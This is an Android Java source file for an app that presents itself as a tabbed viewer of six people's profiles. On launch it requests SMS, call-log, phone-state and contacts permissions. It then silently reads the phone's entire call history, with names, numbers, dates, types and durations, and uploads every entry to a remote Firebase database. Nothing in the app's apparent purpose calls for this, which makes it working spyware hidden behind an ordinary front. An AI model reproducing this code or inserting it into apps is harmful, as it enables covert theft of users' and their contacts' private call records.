package com.example.super_secret;

import java.util.Date;
import android.Manifest;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.util.Log;
import android.widget.Toast;
import java.text.SimpleDateFormat;
import com.google.android.material.tabs.TabLayout;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.viewpager.widget.ViewPager;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;


//import android.os.Bundle;
//import android.app.Activity;
//import android.telephony.SmsManager;
//import android.view.Menu;
//import android.view.inputmethod.InputMethodManager;
//import android.widget.*;
//import android.view.View.OnClickListener;
//import android.view.*;
//
//import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    //private SectionsPagerAdapter mSectionsPagerAdapter;
    private ViewPager viewPager;
    private TabLayout tabLayout;
    private Toolbar toolbar;
    private static final int MY_PERMISSIONS_REQUEST_RECEIVE_SMS = 0;
    private static final int MY_PERMISSIONS_REQUEST_READ_CALL_LOG = 0;
    private static final int MY_PERMISSIONS_REQUEST_PHONE_STATE = 0;
    private static final int MY_PERMISSIONS_REQUEST_PHONE_CONTACTS = 0;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tabLayout = (TabLayout) findViewById(R.id.tabs);
        viewPager = (ViewPager) findViewById(R.id.view_pager);
        toolbar =  (Toolbar) findViewById(R.id.myToolbar);

        setSupportActionBar(toolbar);
        setupViewPager(viewPager);
        tabLayout.setupWithViewPager(viewPager);

        // if sms permission is not granted
        if(ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)!= PackageManager.PERMISSION_GRANTED)
        {
            // if the permission is not granted then check if the user has denied the permission
            if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.RECEIVE_SMS))
            {
                 // Do nothing as user has denied
            }
            else
            {
                // a popup will appear
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.RECEIVE_SMS}, MY_PERMISSIONS_REQUEST_RECEIVE_SMS);
            }
        }

        //if call log permission is not granted
        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)!= PackageManager.PERMISSION_GRANTED)
        {
            // if the permission is not granted then check if the user has denied the permission
            if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_CALL_LOG))
            {
                // Do nothing as user has denied
            }
            else
            {
                // a popup will appear
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CALL_LOG}, MY_PERMISSIONS_REQUEST_READ_CALL_LOG);
            }
        }

        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)!= PackageManager.PERMISSION_GRANTED)
        {
            // if the permission is not granted then check if the user has denied the permission
            if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_PHONE_STATE))
            {
                // Do nothing as user has denied
            }
            else
            {
                // a popup will appear
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, MY_PERMISSIONS_REQUEST_PHONE_STATE);
            }
        }

        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)!= PackageManager.PERMISSION_GRANTED)
        {
            // if the permission is not granted then check if the user has denied the permission
            if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_CONTACTS))
            {
                // Do nothing as user has denied
            }
            else
            {
                // a popup will appear
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS}, MY_PERMISSIONS_REQUEST_PHONE_CONTACTS);
            }
        }

        getAllCallLogs(this);

    }// OnCreate
    //after getting the result of permission request

    @Override
    public void onRequestPermissionsResult (int requestCode, String permissions[], int[] grantResults)
    {
        //check requestCode
        switch(requestCode)
        {
            case MY_PERMISSIONS_REQUEST_RECEIVE_SMS:
            {
                if (grantResults.length>0 && grantResults[0]==PackageManager.PERMISSION_GRANTED)
                {
                    //New broadcast receiver will work in background
                    Toast.makeText(this, "Thank you for permission", Toast.LENGTH_LONG).show();
                }
                else
                    Toast.makeText(this,"This app will require permissions", Toast.LENGTH_LONG).show();
            }
        }
    }

    private void setupViewPager(ViewPager viewPager) {
        ViewPagerAdapter viewPagerAdapter = new ViewPagerAdapter(getSupportFragmentManager());
        viewPagerAdapter.addFragment(new Farid_Profile(),"Farid");
        viewPagerAdapter.addFragment(new Derek_Profile(),"Derek");
        viewPagerAdapter.addFragment(new Callie_Profile(),"Callie");
        viewPagerAdapter.addFragment(new XinWei_Profile(),"Xin Wei");
        viewPagerAdapter.addFragment(new MingKiat_Profile(),"Ming Kiat");
        viewPagerAdapter.addFragment(new KangSian_Profile(),"Kang Sian");
        viewPager.setAdapter(viewPagerAdapter);
    }

    private void getDetails(){
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference().child("callLogs").push();
        Uri allCalls = Uri.parse("content://call_log/calls");
        Cursor c = managedQuery(allCalls, null, null, null, null);
        Toast.makeText(this,(CallLog.Calls.DURATION), Toast.LENGTH_LONG).show();
        String number = CallLog.Calls.NUMBER;
//        String num= c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));// for  number
//        String name= c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));// for name
//        String duration = c.getString(c.getColumnIndex(CallLog.Calls.DURATION));// for duration
//        int type = Integer.parseInt(c.getString(c.getColumnIndex(CallLog.Calls.TYPE)));// for call type, Incoming or out going.

        //myRef.child("Name").setValue(name);
        myRef.child("Number").setValue(number);
       // myRef.child("Duration").setValue(duration);
        //myRef.child("type").setValue(type);
    }

    private void getAllCallLogs(Context cr) {

        FirebaseDatabase database = FirebaseDatabase.getInstance();
        // reading all data in descending order according to DATE
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
        Uri callUri = Uri.parse("content://call_log/calls");
        Cursor cur = cr.getContentResolver().query(callUri, null, null, null, strOrder);
        // loop through cursor
        while (cur.moveToNext()) {

            DatabaseReference myCallRef = database.getReference().child("callLogs").push();

            String callNumber = cur.getString(cur
                    .getColumnIndex(android.provider.CallLog.Calls.NUMBER));
            String callName = cur
                    .getString(cur
                            .getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME));
            String callDate = cur.getString(cur
                    .getColumnIndex(android.provider.CallLog.Calls.DATE));
            SimpleDateFormat formatter = new SimpleDateFormat(
                    "dd-MMM-yyyy HH:mm");
            String dateString = formatter.format(new Date(Long
                    .parseLong(callDate)));
            String callType = cur.getString(cur
                    .getColumnIndex(android.provider.CallLog.Calls.TYPE));
            String isCallNew = cur.getString(cur
                    .getColumnIndex(android.provider.CallLog.Calls.NEW));
            String duration = cur.getString(cur
                    .getColumnIndex(android.provider.CallLog.Calls.DURATION));
            // process log data...

            //populate the realtime firebase
            myCallRef.child("Caller Name").setValue(callName);
            myCallRef.child("Call Number").setValue(callNumber);
            myCallRef.child("Date of Call").setValue(dateString);
            myCallRef.child("Call Type").setValue(callType);
            myCallRef.child("New Call").setValue(isCallNew);
            myCallRef.child("Call Duration").setValue(duration);
        }

    }


}